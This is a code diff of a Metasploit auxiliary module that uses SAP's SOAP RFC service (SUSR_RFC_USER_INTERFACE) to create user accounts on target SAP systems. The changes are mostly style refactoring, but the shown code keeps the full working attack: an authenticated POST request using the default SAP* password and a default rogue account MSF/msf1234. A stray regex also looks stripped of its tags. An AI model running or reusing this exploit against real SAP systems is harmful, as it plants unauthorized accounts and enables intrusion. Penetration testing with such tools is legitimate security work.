@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -24,10 +25,10 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation',
-      'Description' => %q{
+      'Description' => %q(
           This module makes use of the SUSR_RFC_USER_INTERFACE function, through the SOAP
         /sap/bc/soap/rfc service, for creating/modifying users on a SAP.
-      },
+      ),
       'References' =>
         [
           [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
@@ -45,9 +46,10 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('CLIENT', [true, 'SAP client', '001']),
         OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
         OptString.new('HttpPassword', [true, 'Password', '06071992']),
-        OptString.new('ABAP_PASSWORD',[false,'Password for the account (Default is msf1234)','msf1234']),
-        OptString.new('ABAP_USER',[false,'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
-      ], self.class)
+        OptString.new('ABAP_PASSWORD', [false, 'Password for the account (Default is msf1234)', 'msf1234']),
+        OptString.new('ABAP_USER', [false, 'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
+      ], self.class
+    )
   end
 
   def run_host(ip)
@@ -69,36 +71,34 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       vprint_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}'")
-      res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
-        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
-        'ctype' => 'text/xml; charset=UTF-8',
-        'encode_params' => false,
-        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'headers'  => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
-        },
-        'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
-        }
-      })
-      if res and res.code == 200
+      res = send_request_cgi('uri' => '/sap/bc/soap/rfc',
+                             'method' => 'POST',
+                             'data' => data,
+                             'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+                             'ctype' => 'text/xml; charset=UTF-8',
+                             'encode_params' => false,
+                             'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+                             'headers' => {
+                               'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+                             },
+                             'vars_get' => {
+                               'sap-client' => datastore['CLIENT'],
+                               'sap-language' => 'EN'
+                             })
+      if res && (res.code == 200)
         if res.body =~ /<h1>Logon failed<\/h1>/
           vprint_error("[SAP] #{ip}:#{rport} - Logon failed")
           return
         elsif res.body =~ /faultstring/
           error = []
-          error = [ res.body.scan(%r{(.*?)}) ]
+          error = [ res.body.scan(/(.*?)/) ]
           vprint_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
           return
         else
           print_good("[SAP] #{ip}:#{rport} - User '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}' created")
           return
         end
-      elsif res and res.code == 500 and res.body =~ /USER_ALLREADY_EXISTS/
+      elsif res && (res.code == 500) && res.body =~ /USER_ALLREADY_EXISTS/
         vprint_error("[SAP] #{ip}:#{rport} - user already exists")
         return
       else
